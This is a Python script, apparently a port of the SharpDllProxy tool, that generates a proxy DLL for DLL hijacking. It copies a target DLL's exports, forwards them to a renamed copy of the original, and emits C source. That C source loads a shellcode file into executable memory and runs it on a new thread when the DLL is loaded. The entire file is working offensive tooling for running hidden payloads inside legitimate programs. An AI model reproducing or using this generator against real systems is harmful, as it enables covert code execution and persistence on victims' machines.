#!/usr/bin/env python3
import os
import sys
import argparse
from pathlib import Path
import pefile

dll_template = """
#include "pch.h"
#include <stdio.h>
#include <stdlib.h>

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)

PRAGMA_COMMENTS

DWORD WINAPI DoMagic(LPVOID lpParameter)
{
	//https://stackoverflow.com/questions/14002954/c-programming-how-to-read-the-whole-file-contents-into-a-buffer
	FILE* fp;
	size_t size;
	unsigned char* buffer;

	fp = fopen("PAYLOAD_PATH", "rb");
	fseek(fp, 0, SEEK_END);
	size = ftell(fp);
	fseek(fp, 0, SEEK_SET);
	buffer = (unsigned char*)malloc(size);
	
	//https://ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources
	fread(buffer, size, 1, fp);

	void* exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	memcpy(exec, buffer, size);

	((void(*) ())exec)();

	return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD ul_reason_for_call,
	LPVOID lpReserved
)
{
	HANDLE threadHandle;

	switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
			// https://gist.github.com/securitytube/c956348435cc90b8e1f7
			// Create a thread and close the handle as we do not want to use it to wait for it 
			threadHandle = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);
			CloseHandle(threadHandle);

		case DLL_THREAD_ATTACH:
			break;
		case DLL_THREAD_DETACH:
			break;
		case DLL_PROCESS_DETACH:
			break;
	}
	return TRUE;
}
"""


def generate_temp_name():
    """Generate a temporary filename"""
    import tempfile
    temp_file = tempfile.NamedTemporaryFile(delete=False)
    temp_name = Path(temp_file.name).stem
    temp_file.close()
    os.unlink(temp_file.name)
    return temp_name


def get_exported_functions(dll_path):
    """Extract exported functions from DLL using pefile"""
    try:
        pe = pefile.PE(dll_path)
        exports = []
        
        if hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
            for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
                if exp.name:
                    exports.append({
                        'name': exp.name.decode('utf-8') if isinstance(exp.name, bytes) else exp.name,
                        'ordinal': exp.ordinal
                    })
                else:
                    # Handle exports by ordinal only
                    exports.append({
                        'name': f'Ordinal_{exp.ordinal}',
                        'ordinal': exp.ordinal
                    })
        
        return exports
    except Exception as e:
        print(f"[!] Error reading PE file: {e}")
        return []


def main():
    parser = argparse.ArgumentParser(description='SharpDllProxy - DLL Proxy Generator')
    parser.add_argument('--dll', '-dll', required=True, help='Path to the original DLL')
    parser.add_argument('--payload', '-payload', default='shellcode.bin', 
                        help='Path to shellcode payload (default: shellcode.bin)')
    
    args = parser.parse_args()
    
    # Validate DLL path
    org_dll_path = Path(args.dll).resolve()
    if not org_dll_path.exists():
        print(f"[!] Cannot locate DLL path: {org_dll_path}")
        sys.exit(1)
    
    # Validate payload path
    payload_path = Path(args.payload).name
    if not payload_path:
        print("[!] Shellcode filename/path is empty, bad input!")
        sys.exit(1)
    
    # Generate temp name for renamed original DLL
    temp_name = generate_temp_name()
    
    # Create output directory
    output_dir = Path(f"output_{org_dll_path.stem}")
    output_dir.mkdir(exist_ok=True)
    
    print(f"[+] Reading exports from {org_dll_path}...")
    
    # Read exported functions
    exported_functions = get_exported_functions(str(org_dll_path))
    
    if not exported_functions:
        print("[!] No exported functions found or error reading DLL")
        sys.exit(1)
    
    # Build pragma comments
    pragma_builder = ""
    for func in exported_functions:
        pragma_builder += f'#pragma comment(linker, "/export:{func["name"]}={temp_name}.{func["name"]},@{func["ordinal"]}")\n'
    
    print(f"[+] Redirected {len(exported_functions)} function calls from {org_dll_path.name} to {temp_name}.dll")
    
    # Replace placeholders in template
    output_template = dll_template.replace("PRAGMA_COMMENTS", pragma_builder)
    output_template = output_template.replace("PAYLOAD_PATH", payload_path)
    
    # Write output files
    output_c_file = output_dir / f"{org_dll_path.stem}_pragma.c"
    output_dll_file = output_dir / f"{temp_name}.dll"
    
    print(f"[+] Exporting DLL C source to {output_c_file}")
    
    with open(output_c_file, 'w', encoding='utf-8') as f:
        f.write(output_template)
    
    # Copy original DLL with new name
    with open(org_dll_path, 'rb') as src, open(output_dll_file, 'wb') as dst:
        dst.write(src.read())
    
    print(f"[+] Copied original DLL to {output_dll_file}")
    print("[+] Done!")


if __name__ == "__main__":
    main()
